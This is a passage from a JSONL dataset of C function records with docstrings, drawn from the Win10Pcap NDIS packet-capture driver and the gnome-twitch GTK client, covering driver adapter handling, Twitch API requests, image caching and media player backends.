NULL)\n\t\t\t\t{\n\t\t\t\t\tMmUnlockPages(mdl);\n\t\t\t\t\tIoFreeMdl(mdl);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tirp->IoStatus.Information = ret_size;\n\tirp->IoStatus.Status = ret;\n\tIoCompleteRequest(irp, IO_NO_INCREMENT);\n\n\treturn ret;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Sleep\n", "func_signal": "void SlSleep(int milliSeconds)", "code": "{\n\tPKTIMER timer = SlMalloc(sizeof(KTIMER));\n\tLARGE_INTEGER duetime;\n\n\tduetime.QuadPart = (__int64)milliSeconds * -10000;\n\tKeInitializeTimerEx(timer, NotificationTimer);\n\tKeSetTimerEx(timer, duetime, 0, NULL);\n\n\tKeWaitForSingleObject(timer, Executive, KernelMode, FALSE, NULL);\n\n\tSlFree(timer);\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// NDIS unbind notification procedure\n", "func_signal": "NDIS_STATUS SlNdisUnbindAdapterExProc(NDIS_HANDLE unbind_context, NDIS_HANDLE protocol_binding_context)", "code": "{\n\tNDIS_STATUS ret;\n\tSL_ADAPTER *a = (SL_ADAPTER *)protocol_binding_context;\n\tUINT j;\n\tNDIS_HANDLE adapter_handle = NULL;\n\n\tif (a->Halt)\n\t{\n\t\t//SL_WHERE;\n\t}\n\n\tadapter_handle = a->AdapterHandle;\n\ta->Halt = true;\n\tif (a->Device != NULL)\n\t{\n\t\ta->Device->Halting = true;\n\t}\n\ta->AdapterHandle = NULL;\n\n\tSlLock(a->Lock);\n\t{\n\t}\n\tSlUnlock(a->Lock);\n\n\ta->UnbindContext = unbind_context;\n\ta->IsClosePending = true;\n\n\t// Delete the adapter from the adapter list\n\tSlLockList(sl->AdapterList);\n\t{\n\t\tSlDelete(sl->AdapterList, a);\n\t}\n\tSlUnlockList(sl->AdapterList);\n\n\tfor (j = 0;j < 32;j++)\n\t{\n\t\t// Wait until the number of OID requests of being processed by this adapter becomes zero\n\t\twhile (true)\n\t\t{\n\t\t\tUINT num;\n\n\t\t\tnum = a->NumPendingOidRequests;\n\n\t\t\tif (num == 0)\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tj = 0;\n\t\t\t}\n\n\t\t\t//SlSleep(50);\n\t\t}\n\n\t\t// Wait until the number of packets this adapter is transmitting becomes zero\n\t\twhile (true)\n\t\t{\n\t\t\tUINT num;\n\n\t\t\tnum = a->NumPendingSendPackets;\n\n\t\t\tif (num == 0)\n\t\t\t{\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tj = 0;\n\t\t\t}\n\n\t\t\t//SlSleep(50);\n\t\t}\n\n\t}\n\n\tret = NdisCloseAdapterEx(adapter_handle);\n\n\tif (ret != NDIS_STATUS_PENDING)\n\t{\n\t\ta->IsClosePending = false;\n\t\tSlNdisCloseAdapterCompleteExProc(a);\n\n\t\tret = NDIS_STATUS_SUCCESS;\n\n\t\tInterlockedDecrement(&sl->NumBoundAdapters);\n\t}\n\n\treturn ret;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Device is closed\n", "func_signal": "NTSTATUS SlDeviceCloseProc(DEVICE_OBJECT *device_object, IRP *irp)", "code": "{\n\tSL_DEVICE *dev = *((SL_DEVICE **)device_object->DeviceExtension);\n\tNTSTATUS ret = STATUS_UNSUCCESSFUL;\n\tIO_STACK_LOCATION *irp_stack = IoGetCurrentIrpStackLocation(irp);\n\n\tif (dev->IsBasicDevice)\n\t{\n\t\t// Basic device\n\t\tret = STATUS_SUCCESS;\n\t}\n\telse\n\t{\n\t\t// Adapter device\n\t\tSL_FILE *f = irp_stack->FileObject->FsContext;\n\n\t\tif (f != NULL)\n\t\t{\n\t\t\tbool clear_filter = false;\n\n\t\t\t// Wait until the number of packet being sent becomes the zero\n\t\t\twhile (true)\n\t\t\t{\n\t\t\t\tif (f->NumSendingPacketets == 0)\n\t\t\t\t{\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tSlSleep(50);\n\t\t\t}\n\n\t\t\tSlLock(dev->OpenCloseLock);\n\t\t\t{\n\t\t\t\t// Delete the file from the list\n\t\t\t\tSlLockList(dev->FileList);\n\t\t\t\t{\n\t\t\t\t\tSlDelete(dev->FileList, f);\n\n\t\t\t\t\tif (SL_LIST_NUM(dev->FileList) == 0)\n\t\t\t\t\t{\n\t\t\t\t\t\t// Clear the filter when all files are closed\n\t\t\t\t\t\tclear_filter = true;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tSlUnlockList(dev->FileList);\n\n\t\t\t\tif (dev->Adapter->Halt)\n\t\t\t\t{\n\t\t\t\t\tclear_filter = false;\n\t\t\t\t}\n\n\t\t\t\tif (clear_filter)\n\t\t\t\t{\n\t\t\t\t\tInterlockedIncrement(&dev->Adapter->NumPendingOidRequests);\n\t\t\t\t}\n\t\t\t}\n\t\t\tSlUnlock(dev->OpenCloseLock);\n\n\t\t\tif (clear_filter)\n\t\t\t{\n\t\t\t\t// Clear the filter when all files are closed\n\t\t\t\tUINT filter = 0;\n\t\t\t\tSlSendOidRequest(dev->Adapter, true, OID_GEN_CURRENT_PACKET_FILTER, &filter, sizeof(filter));\n\t\t\t\tInterlockedDecrement(&dev->Adapter->NumPendingOidRequests);\n\t\t\t}\n\n\t\t\t// Release the event\n\t\t\tSlFreeEvent(f->Event);\n\n\t\t\t// Release the receive queue\n\t\t\tif (true)\n\t\t\t{\n\t\t\t\tSL_PACKET *p = f->RecvPacketHead;\n\n\t\t\t\twhile (p != NULL)\n\t\t\t\t{\n\t\t\t\t\tSL_PACKET *p_next = p->Next;\n\n\t\t\t\t\tSlFree(p);\n\n\t\t\t\t\tp = p_next;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t// Release the NET_BUFFER_LIST pool\n\t\t\tNdisFreeNetBufferListPool(f->NetBufferListPool);\n\n\t\t\t// Release the lock\n\t\t\tSlFreeLock(f->RecvLock);\n\n\t\t\tSlFree(f);\n\n\t\t\tret = STATUS_SUCCESS;\n\t\t}\n\t}\n\n\tirp->IoStatus.Status = ret;\n\tIoCompleteRequest(irp, IO_NO_INCREMENT);\n\n\treturn ret;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Release the SL_ADAPTER\n", "func_signal": "void SlFreeAdapter(SL_ADAPTER *a)", "code": "{\n\t// Validate arguments\n\tif (a == NULL)\n\t{\n\t\treturn;\n\t}\n\n\tSlFreeUnicode(a->AdapterName);\n\n\tSlFreeLock(a->Lock);\n\n\tSlFree(a);\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Set the event\n", "func_signal": "void SlSet(SL_EVENT *event)", "code": "{\n\t// Validate arguments\n\tif (event == NULL)\n\t{\n\t\treturn;\n\t}\n\n\tKeSetEvent(event->event, 0, FALSE);\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Clear to zero by allocating the memory\n", "func_signal": "void *SlZeroMalloc(UINT size)", "code": "{\n\tvoid *p = SlMalloc(size);\n\tif (p == NULL)\n\t{\n\t\t// Memory allocation failure\n\t\treturn NULL;\n\t}\n\n\t// Clear to zero\n\tSlZero(p, size);\n\n\treturn p;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Unlock the list\n", "func_signal": "void SlUnlockList(SL_LIST *o)", "code": "{\n\t// Validate arguments\n\tif (o == NULL)\n\t{\n\t\treturn;\n\t}\n\n\tSlUnlock(o->lock);\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Delete all elements from the list\n", "func_signal": "void SlDeleteAll(SL_LIST *o)", "code": "{\n\t// Validate arguments\n\tif (o == NULL)\n\t{\n\t\treturn;\n\t}\n\n\to->num_item = 0;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// NDIS PnP notification procedure\n", "func_signal": "NDIS_STATUS SlNdisNetPnPEventProc(NDIS_HANDLE protocol_binding_context, NET_PNP_EVENT_NOTIFICATION *net_pnp_event)", "code": "{\n\tSL_ADAPTER *a = (SL_ADAPTER *)protocol_binding_context;\n\n\tif (net_pnp_event != NULL)\n\t{\n\t\tif (net_pnp_event->NetPnPEvent.NetEvent == NetEventBindsComplete)\n\t\t{\n\t\t\tsl->IsEnumCompleted = true;\n\t\t}\n\n\t\tif (net_pnp_event->NetPnPEvent.NetEvent == NetEventSetPower)\n\t\t{\n\t\t\tTIME_DESYNCHRONIZE(&G_Start_Time);\n\n\t\t\tTIME_SYNCHRONIZE(&G_Start_Time);\n\t\t}\n\t}\n\n\treturn NDIS_STATUS_SUCCESS;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Lock the list\n", "func_signal": "void SlLockList(SL_LIST *o)", "code": "{\n\t// Validate arguments\n\tif (o == NULL)\n\t{\n\t\treturn;\n\t}\n\n\tSlLock(o->lock);\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "// Create a Unicode\n", "func_signal": "SL_UNICODE *SlNewUnicode(char *str)", "code": "{\n\tSL_UNICODE *u;\n\t// Validate arguments\n\tif (str == NULL)\n\t{\n\t\treturn NULL;\n\t}\n\n\t// Memory allocation\n\tu = SlZeroMalloc(sizeof(SL_UNICODE));\n\tif (u == NULL)\n\t{\n\t\treturn NULL;\n\t}\n\n\t// String initialization\n\tNdisInitializeString(&u->String, str);\n\n\treturn u;\n}", "path": "NdisDriver\\NdisDriver.c", "repo_name": "SoftEtherVPN/Win10Pcap", "stars": 321, "license": "other", "language": "c", "size": 14561}
{"docstring": "//TODO: Rewrite this once we start displaying channel info again\n", "func_signal": "GList*\ngt_twitch_channel_info(GtTwitch* self, const gchar* chan)", "code": "{\n    GtTwitchPrivate* priv = gt_twitch_get_instance_private(self);\n    SoupMessage* msg;\n    gchar* uri = NULL;\n    JsonParser* parser;\n    JsonNode* node;\n    JsonReader* reader;\n    GList* ret = NULL;\n\n    INFOF(\"Getting channel info for='%s'\", chan);\n\n    uri = g_strdup_printf(CHANNEL_INFO_URI, chan);\n\n    msg = soup_message_new(\"GET\", uri);\n\n    if (!send_message(self, msg))\n    {\n        WARNINGF(\"Error getting chat badges for channel='%s'\", chan);\n        goto finish;\n    }\n\n    parser = json_parser_new();\n    json_parser_load_from_data(parser, msg->response_body->data, msg->response_body->length, NULL); //TODO: Error handling\n    node = json_parser_get_root(parser);\n    reader = json_reader_new(node);\n\n    for (gint i = 0; i < json_reader_count_elements(reader); i++)\n    {\n        GtTwitchChannelInfoPanel* panel = gt_twitch_channel_info_panel_new();\n        const gchar* type = NULL;\n\n        json_reader_read_element(reader, i);\n\n        json_reader_read_member(reader, \"display_order\");\n        panel->order = json_reader_get_int_value(reader) - 1;\n        json_reader_end_member(reader);\n\n        json_reader_read_member(reader, \"kind\");\n        type = json_reader_get_string_value(reader);\n        if (g_strcmp0(type, \"default\") == 0)\n        {\n            panel->type = GT_TWITCH_CHANNEL_INFO_PANEL_TYPE_DEFAULT;\n        }\n        else\n        {\n            //TODO: Eventually handle other types of panels\n            gt_twitch_channel_info_panel_free(panel);\n            json_reader_end_member(reader);\n            json_reader_end_element(reader);\n            continue;\n        }\n        json_reader_end_member(reader);\n\n        json_reader_read_member(reader, \"html_description\");\n        if (!json_reader_get_null_value(reader))\n            panel->html_description = g_strdup(json_reader_get_string_value(reader));\n        json_reader_end_member(reader);\n\n        json_reader_read_member(reader, \"data\");\n\n        json_reader_read_member(reader, \"link\");\n        panel->link = g_strdup(json_reader_get_string_value(reader));\n        json_reader_end_member(reader);\n\n        json_reader_read_member(reader, \"image\");\n        /* panel->image = gt_twitch_download_picture(self, json_reader_get_string_value(reader), 0); */\n        json_reader_end_member(reader);\n\n        if (json_reader_read_member(reader, \"description\"))\n            panel->markdown_description = g_strdup(json_reader_get_string_value(reader));\n        json_reader_end_member(reader);\n\n        if (json_reader_read_member(reader, \"title\"))\n            panel->title = g_strdup(json_reader_get_string_value(reader));\n        json_reader_end_member(reader);\n\n        json_reader_end_member(reader);\n\n        json_reader_end_element(reader);\n\n        ret = g_list_append(ret, panel);\n    }\n\n    g_object_unref(parser);\n    g_object_unref(reader);\n\nfinish:\n    g_free(uri);\n    g_object_unref(msg);\n\n    return ret;\n}", "path": "src\\gt-twitch.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "//TODO: Refactor GtTwitch to use these new functions\n", "func_signal": "static void\nnew_send_message(GtTwitch* self, SoupMessage* msg, GError** error)", "code": "{\n    g_assert(GT_IS_TWITCH(self));\n    g_assert(SOUP_IS_MESSAGE(msg));\n\n    GtTwitchPrivate* priv = gt_twitch_get_instance_private(self);\n    char* uri = soup_uri_to_string(soup_message_get_uri(msg), FALSE);\n\n    DEBUGF(\"Sending message to uri '%s'\", uri);\n\n    soup_message_headers_append(msg->request_headers, \"Client-ID\", CLIENT_ID);\n\n    soup_session_send_message(priv->soup, msg);\n\n    if (SOUP_STATUS_IS_SUCCESSFUL(msg->status_code))\n    {\n        TRACEF(\"Received response from url '%s' with code '%d' and body '%s'\",\n               uri, msg->status_code, msg->response_body->data);\n    }\n    else\n    {\n        gint code;\n\n        WARNINGF(\"Received unsuccessful response from url '%s' with code '%d' and body '%s'\",\n                 uri, msg->status_code, msg->response_body->data);\n\n        code = msg->status_code == GT_TWITCH_ERROR_SOUP_NOT_FOUND ?\n            GT_TWITCH_ERROR_SOUP_NOT_FOUND : GT_TWITCH_ERROR_SOUP_GENERIC;\n\n        g_set_error(error, GT_TWITCH_ERROR, code,\n            \"Received unsuccessful response from url '%s' with code '%d' and body '%s'\",\n            uri, msg->status_code, msg->response_body->data);\n    }\n\n    g_free(uri);\n}", "path": "src\\gt-twitch.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "//Source -> target\n", "func_signal": "static gboolean\nhandle_position_to(GBinding* binding,\n                   const GValue* from,\n                   GValue* to,\n                   gpointer udata)", "code": "{\n    GtPlayer* self = GT_PLAYER(udata);\n    GtPlayerPrivate* priv = gt_player_get_instance_private(self);\n    gint width = gtk_widget_get_allocated_width(priv->docking_pane);\n    gdouble mult = g_value_get_double(from);\n\n    g_value_set_int(to, (gint) (width*mult));\n\n    return TRUE;\n}", "path": "src\\gt-player.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "//TODO Parse more tags\n", "func_signal": "static void\nstart_element(GMarkupParseContext* ctxt,\n              const gchar* element_name,\n              const gchar** attr_names,\n              const gchar** attr_vals,\n              gpointer udata,\n              GError** error)", "code": "{\n    GtTwitchChannelInfoDlg* self = GT_TWITCH_CHANNEL_INFO_DLG(udata);\n    GtTwitchChannelInfoDlgPrivate* priv = gt_twitch_channel_info_dlg_get_instance_private(self);\n    GtkTextIter iter;\n\n    gtk_text_buffer_get_end_iter(priv->cur_buff, &iter);\n\n    if (g_strcmp0(element_name, HTML_PARAGRAPH) == 0)\n    {\n        //Do nothing\n    }\n    else if (g_strcmp0(element_name, HTML_LINK) == 0)\n    {\n        const gchar** n = attr_names;\n        const gchar** v = attr_vals;\n        for (n = attr_names; n != NULL; n++, v++)\n        {\n            if (g_strcmp0(*n, \"href\") == 0)\n            {\n                gint* pos = g_malloc(sizeof(gint)*1);\n                *pos = gtk_text_iter_get_offset(&iter);\n                g_queue_push_head(priv->offset_queue, pos);\n                priv->cur_link = g_strdup(*v);\n                break;\n            }\n        }\n    }\n    else if (g_strcmp0(element_name, HTML_STRONG) == 0)\n    {\n        gint* pos = g_malloc(sizeof(gint)*1);\n        *pos = gtk_text_iter_get_offset(&iter);\n        g_queue_push_head(priv->offset_queue, pos);\n\n    }\n    else if (g_strcmp0(element_name, HTML_LIST) == 0)\n    {\n        //Do nothing\n    }\n    else if (g_strcmp0(element_name, HTML_LIST_ITEM) == 0)\n    {\n        gtk_text_buffer_insert(priv->cur_buff, &iter, \"\u2022 \", -1);\n    }\n    else if (g_strcmp0(element_name, HTML_HEADER_1) == 0)\n    {\n        gint* pos = g_malloc(sizeof(gint)*1);\n        *pos = gtk_text_iter_get_offset(&iter);\n        g_queue_push_head(priv->offset_queue, pos);\n    }\n}", "path": "src\\gt-twitch-channel-info-dlg.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* Should only be used by children */\n", "func_signal": "void\ngt_container_view_add_container(GtContainerView* self, GtItemContainer* container)", "code": "{\n    GtContainerViewPrivate* priv = gt_container_view_get_instance_private(self);\n\n    gtk_container_add(GTK_CONTAINER(priv->container_stack),\n        GTK_WIDGET(container));\n\n    gtk_widget_show_all(GTK_WIDGET(container));\n}", "path": "src\\gt-container-view.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* NOTE: This is so dumb but unistd.h already defines pause() */\n", "func_signal": "static void\n_pause(GtPlayerBackend* backend)", "code": "{\n    RETURN_IF_FAIL(GT_IS_PLAYER_BACKEND_MPV_OPENGL(backend));\n\n    GtPlayerBackendMpvOpenGL* self = GT_PLAYER_BACKEND_MPV_OPENGL(backend);\n    GtPlayerBackendMpvOpenGLPrivate* priv = gt_player_backend_mpv_opengl_get_instance_private(self);\n\n    gboolean paused = TRUE;\n    mpv_set_property_async(priv->mpv, 0, \"pause\", MPV_FORMAT_FLAG, &paused);\n}", "path": "player-backends\\player-backend-mpv-opengl\\gt-player-backend-mpv-opengl.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "// Not cancellable; hard to guarantee that channel is not followed\n", "func_signal": "void\ngt_twitch_follow_channel_async(GtTwitch* self, const gchar* chan_name,\n    GAsyncReadyCallback cb, gpointer udata)", "code": "{\n    g_assert(GT_IS_TWITCH(self));\n    g_assert_false(utils_str_empty(chan_name));\n\n    GTask* task = NULL;\n    GenericTaskData* data = NULL;\n\n    task = g_task_new(self, NULL, cb, udata);\n\n    data = generic_task_data_new();\n    data->str_1 = g_strdup(chan_name);\n\n    g_task_set_task_data(task, data, (GDestroyNotify) generic_task_data_free);\n\n    g_task_run_in_thread(task, follow_channel_async_cb);\n\n    g_object_unref(task);\n}", "path": "src\\gt-twitch.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* FIXME: Throw error */\n", "func_signal": "static GdkPixbuf*\ndownload_image(GtResourceDownloader* self,\n    const gchar* uri, const gchar* name,\n    SoupMessage* msg, GInputStream* istream,\n    gboolean* from_file, GError** error)", "code": "{\n    RETURN_VAL_IF_FAIL(GT_IS_RESOURCE_DOWNLOADER(self), NULL);\n    RETURN_VAL_IF_FAIL(!utils_str_empty(uri), NULL);\n    RETURN_VAL_IF_FAIL(SOUP_IS_MESSAGE(msg), NULL);\n    RETURN_VAL_IF_FAIL(G_IS_INPUT_STREAM(istream), NULL);\n\n    GtResourceDownloaderPrivate* priv = gt_resource_downloader_get_instance_private(self);\n    g_autofree gchar* filename = NULL;\n    gint64 file_timestamp = 0;\n    gboolean file_exists = FALSE;\n    g_autoptr(GdkPixbuf) ret = NULL;\n    g_autoptr(GError) err = NULL;\n\n        /* NOTE: If we aren't supplied a filename, we'll just create one by hashing the uri */\n    if (utils_str_empty(name))\n    {\n        gchar hash_str[15];\n        guint hash = 0;\n\n        hash = g_str_hash(uri); /* TODO: Replace this with murmur3 hash */\n\n        g_sprintf(hash_str, \"%ud\", hash);\n\n        filename = g_build_filename(priv->filepath, hash_str, NULL);\n    }\n    else\n        filename = g_build_filename(priv->filepath, name, NULL);\n\n    if (priv->filepath && (file_exists = g_file_test(filename, G_FILE_TEST_EXISTS)))\n    {\n        file_timestamp = utils_timestamp_filename(filename, NULL);\n    }\n\n    if (SOUP_STATUS_IS_SUCCESSFUL(msg->status_code))\n    {\n        const gchar* last_modified_str = NULL;\n\n        DEBUG(\"Successful return code from uri '%s'\", uri);\n\n        last_modified_str = soup_message_headers_get_one(msg->response_headers, \"Last-Modified\");\n\n        if (utils_str_empty(last_modified_str))\n        {\n            DEBUG(\"No 'Last-Modified' header in response from uri '%s'\", uri);\n\n            goto download;\n        }\n        else if (utils_http_full_date_to_timestamp(last_modified_str) < file_timestamp)\n        {\n            DEBUG(\"No new image at uri '%s'\", uri);\n\n            if (file_exists)\n            {\n                DEBUG(\"Loading image from file '%s'\", filename);\n\n                ret = gdk_pixbuf_new_from_file(filename, NULL);\n\n                if (from_file) *from_file = TRUE;\n            }\n            else\n            {\n                DEBUG(\"Image doesn't exist locally\");\n\n                goto download;\n            }\n        }\n        else\n        {\n        download:\n            DEBUG(\"New image at uri '%s'\", uri);\n\n            ret = gdk_pixbuf_new_from_stream(istream, NULL, &err);\n\n            if (err)\n            {\n                WARNING(\"Unable to download image from uri '%s' because: %s\",\n                    uri, err->message);\n\n                g_propagate_prefixed_error(error, g_steal_pointer(&err),\n                    \"Unable to download image from uri '%s' because: \", uri);\n\n                return NULL;\n            }\n\n            if (priv->filepath && STRING_EQUALS(priv->image_filetype, GT_IMAGE_FILETYPE_JPEG))\n            {\n                gdk_pixbuf_save(ret, filename, priv->image_filetype,\n                    NULL, \"quality\", \"100\", NULL);\n            }\n            else if (priv->filepath)\n            {\n                gdk_pixbuf_save(ret, filename, priv->image_filetype,\n                    NULL, NULL);\n            }\n\n            if (from_file) *from_file = FALSE;\n        }\n    }\n\n    return g_steal_pointer(&ret);\n}", "path": "src\\gt-resource-downloader.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "//NOTE: Twitch's stream search API is retarted (see https://github.com/justintv/Twitch-API/issues/513)\n//so we need to do this hack to get anything remotely usable. It will return duplicates unless\n//amount=offset*k where k is some multiple, i.e. it works in 'pages'\n", "func_signal": "GList*\ngt_twitch_search_channels(GtTwitch* self, const gchar* query, gint n, gint offset, gboolean offline, GError** error)", "code": "{\n    g_assert(GT_IS_TWITCH(self));\n    g_assert_cmpint(n, >=, 0);\n    g_assert_cmpint(n, <=, 100);\n    g_assert_cmpint(offset, >=, 0);\n    g_assert_false(utils_str_empty(query));\n\n#define SEARCH_AMOUNT 100\n\n    const gint PAGE_AMOUNT = offline ? 100 : 90;\n\n    MESSAGEF(\"Searching for channels with query '%s', amount '%d' ('%d') and offset '%d' ('%d')\",\n        query, 100, SEARCH_AMOUNT, (offset / PAGE_AMOUNT) * 100, offset);\n\n    g_autoptr(SoupMessage) msg = NULL;\n    g_autoptr(JsonReader) reader = NULL;\n    g_autofree gchar* uri = NULL;\n    gint total;\n    GList* ret = NULL;\n    GError* err = NULL;\n\n    uri = g_strdup_printf(offline ? SEARCH_CHANNELS_URI : SEARCH_STREAMS_URI,\n        query, SEARCH_AMOUNT, (offset / PAGE_AMOUNT) * SEARCH_AMOUNT);\n\n    msg = soup_message_new(\"GET\", uri);\n\n    reader = new_send_message_json(self, msg, &err);\n\n    CHECK_AND_PROPAGATE_ERROR(\"Unable to search channels with query '%s', amount '%d' ('%d') and offset '%d' ('%d')\",\n        query, PAGE_AMOUNT, SEARCH_AMOUNT, (offset / PAGE_AMOUNT) * PAGE_AMOUNT, offset);\n\n    READ_JSON_MEMBER(offline ? \"channels\" : \"streams\");\n\n    total = MIN(n + offset % PAGE_AMOUNT, json_reader_count_elements(reader));\n\n    for (gint i = offset % PAGE_AMOUNT; i < total; i++)\n    {\n        GtChannel* channel = NULL;\n        GtChannelData* data = NULL;\n\n        READ_JSON_ELEMENT(i);\n\n        data = offline ? parse_channel(reader, &err) : parse_stream(reader, &err);\n\n        CHECK_AND_PROPAGATE_ERROR(\"Unable to search channels with query '%s', amount '%d' ('%d') and offset '%d' ('%d')\",\n            query, PAGE_AMOUNT, SEARCH_AMOUNT, (offset / PAGE_AMOUNT) * PAGE_AMOUNT, offset);\n\n        channel = gt_channel_new(data);\n\n        END_JSON_ELEMENT();\n\n        ret = g_list_append(ret, channel);\n    }\n\n    json_reader_end_member(reader);\n\n    return ret;\n\nerror:\n    gt_channel_list_free(ret);\n\n    return NULL;\n}", "path": "src\\gt-twitch.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* NOTE: We need the underscore because pause is already defined in unistd.h */\n", "func_signal": "static void\n_pause(GtPlayerBackend* backend)", "code": "{\n    RETURN_IF_FAIL(GT_IS_PLAYER_BACKEND_GSTREAMER_OPENGL(backend));\n\n    GtPlayerBackendGstreamerOpenGL* self = GT_PLAYER_BACKEND_GSTREAMER_OPENGL(backend);\n    GtPlayerBackendGstreamerOpenGLPrivate* priv = gt_player_backend_gstreamer_opengl_get_instance_private(self);\n\n    gst_element_set_state(priv->playbin, GST_STATE_PAUSED);\n}", "path": "player-backends\\player-backend-gstreamer-opengl\\gt-player-backend-gstreamer-opengl.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* TODO: Move this into set_property */\n", "func_signal": "static void\nauto_update_set_cb(GObject* src,\n    GParamSpec* pspec, gpointer udata)", "code": "{\n    RETURN_IF_FAIL(GT_IS_CHANNEL(src));\n\n    GtChannel* self = GT_CHANNEL(src);\n    GtChannelPrivate* priv = gt_channel_get_instance_private(self);\n\n    if (priv->auto_update)\n    {\n        priv->update_id = g_timeout_add_seconds_full(G_PRIORITY_LOW, 120, /* TODO: Add the timeout as a setting */\n            auto_update_cb, utils_weak_ref_new(self), (GDestroyNotify) utils_weak_ref_free);\n    }\n    else\n        g_source_remove(priv->update_id);\n}", "path": "src\\gt-channel.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* FIXME: Make cancellable */\n", "func_signal": "GdkPixbuf*\ngt_resource_downloader_download_image_immediately(GtResourceDownloader* self,\n    const gchar* uri, const gchar* name, ResourceDownloaderFunc cb,\n    gpointer udata, GError** error)", "code": "{\n    RETURN_VAL_IF_FAIL(GT_IS_RESOURCE_DOWNLOADER(self), NULL);\n    RETURN_VAL_IF_FAIL(!utils_str_empty(uri), NULL);\n\n    GtResourceDownloaderPrivate* priv = gt_resource_downloader_get_instance_private(self);\n    g_autofree gchar* filename = NULL;\n    g_autoptr(GdkPixbuf) ret = NULL;\n    g_autoptr(GError) err = NULL;\n    g_autoptr(SoupMessage) msg = NULL;\n    ResourceData* data = NULL;\n\n    /* NOTE: If we aren't supplied a filename, we'll just create one by hashing the uri */\n    if (utils_str_empty(name))\n    {\n        gchar hash_str[15];\n        guint hash = 0;\n\n        hash = g_str_hash(uri); /* TODO: Replace this with murmur3 hash */\n\n        g_sprintf(hash_str, \"%ud\", hash);\n\n        filename = g_build_filename(priv->filepath, hash_str, NULL);\n    }\n    else\n        filename = g_build_filename(priv->filepath, name, NULL);\n\n    if (priv->filepath && g_file_test(filename, G_FILE_TEST_EXISTS))\n    {\n        ret = gdk_pixbuf_new_from_file(filename, &err);\n\n        if (err)\n        {\n            WARNING(\"Unable to download image because: %s\", err->message);\n\n            g_propagate_prefixed_error(error, g_steal_pointer(&err),\n                \"Unable to download image because: \");\n\n            /* NOTE: Don't return here as we still might be able to\n             * download a new image*/\n        }\n    }\n\n    msg = soup_message_new(SOUP_METHOD_GET, uri);\n    soup_message_headers_append(msg->request_headers, \"Client-ID\", CLIENT_ID);\n\n    data = resource_data_new();\n    data->uri = g_strdup(uri);\n    data->name = g_strdup(name);\n    data->cb = cb;\n    data->udata = udata;\n    data->self = g_object_ref(self);\n    data->msg = g_steal_pointer(&msg);\n\n    soup_session_send_async(priv->soup, data->msg, NULL, send_message_cb, data);\n\n    /* NOTE: Return any found image immediately */\n    return g_steal_pointer(&ret);\n}", "path": "src\\gt-resource-downloader.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
{"docstring": "/* NOTE: This function is to remove a message from the queue if it has\n * been cancelled but not sent yet */\n", "func_signal": "static void\nmsg_cancelled_cb(GCancellable* cancel, gpointer udata)", "code": "{\n    RETURN_IF_FAIL(udata != NULL);\n\n    SoupCallbackData* data = udata;\n    g_autoptr(GtHTTPSoup) self = g_weak_ref_get(data->self);\n\n    if (!self) {TRACE(\"Unreffed\"); return;}\n\n    GtHTTPSoupPrivate* priv = gt_http_soup_get_instance_private(self);\n\n    g_queue_remove(priv->message_queue, data);\n}", "path": "src\\gt-http-soup.c", "repo_name": "vinszent/gnome-twitch", "stars": 443, "license": "other", "language": "c", "size": 13819}
